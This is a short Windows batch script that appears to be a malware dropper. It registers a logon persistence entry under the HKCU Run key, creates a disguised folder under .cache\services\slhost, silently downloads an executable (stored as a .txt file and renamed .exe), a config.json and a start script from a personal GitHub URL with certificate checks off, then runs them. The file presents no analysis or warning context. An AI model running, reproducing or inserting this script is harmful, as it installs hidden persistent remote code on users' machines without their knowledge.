@echo off
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\" 
mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt -o %USERPROFILE%\.cache\services\slhost\slhost.exe
curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/config.json -o %USERPROFILE%\.cache\services\slhost\config.json
curl -ks https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd -o %USERPROFILE%\.cache\services\slhost\Noise.bat
%USERPROFILE%\.cache\services\slhost\Noise.bat
